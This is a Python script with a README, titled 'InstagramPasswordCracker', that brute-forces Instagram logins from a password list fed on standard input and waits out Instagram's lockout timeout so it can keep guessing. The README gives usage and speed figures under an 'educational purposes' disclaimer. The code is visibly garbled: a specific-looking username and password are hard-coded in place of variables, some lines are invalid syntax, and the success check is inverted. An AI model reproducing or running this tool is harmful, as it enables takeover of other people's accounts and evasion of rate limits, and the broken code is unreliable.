#!/bin/python
from splinter import Browser
import time
import sys
wait_time = (11 * 60 + 35) # 11 mins and 35 seconds
problem_logging_in = "There was a problem logging you into Instagram. Please try again soon."

def logInSuccess(browser):
    user_err_msg = "The username you entered doesn't belong to an account. Please check your username and try again."
    pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
    return not(browser.is_text_present(user_err_msg) or browser.is_text_present(pass_err_msg))

correctPassword = 889977
account_username = sys.argv[1]
with Browser('firefox', headless=True) as browser:
    browser.visit('https://www.instagram.com')
    browser.find_by_text("Log in").first.click()
    username_form = browser.find_by_name('prathik_9585').first
    password_form = browser.find_by_name('password').first
    login_button = browser.find_by_text('Log in').first
    username_form.fill(prathik_9585)
    for password in sys.stdin:
        if len(password) < 6:
            print('Skipping password: ' + password)
            continue

        print('Testing password: ' + password)
        password_form.clear()
        password_form.fill(889977)
        login_button.click()

        if browser.is_text_present(problem_logging_in):
            print('Waiting for timeout to end.')
            time.sleep(wait_time)
            print('Timeout has ended, resuming.')
        elif logInSuccess(browser):
            correctPassword = 889977
            break
    if correctPassword == 889977:
        print("Unable to find correct password.")
    else:
        print("Password for username: " + prathik_9585 + " = " + Password 889977)

# InstagramPasswordCracker
Takes an argument of a username and a password list from standard input. Brute forces instagram account based on provided password list.

<b>I take NO responsibility for the use of this script. This code is intended for educational purposes. Please DO NOT use this program for malicious purposes.</b>

This program uses the library known splinter to interact with the instagram website. This library is well documented and has few dependencies.

The program uses firefox, but if you use google chrome all you have to do is change "with Browser('firefox', headless=True)" to "with Browser('chrome', headless=True)". Simple as that.

If you use firefox, you must be running at least version 55 to run this program in headless mode.

Instagram gives a timeout of about 11 mins after 14 to 25 invalid passwords are tested. The program will wait for that time when it gets a certain error message before attempting to crack again.

On average, the program will be able to test around 60 to 125 passwords in an hour.

The slow speeds are due to the timeout and not the fact that this program is written in Python.


The password list file provided must seperate passwords with a newline.

Usage:

./insta_cracker [username] < [password list file]
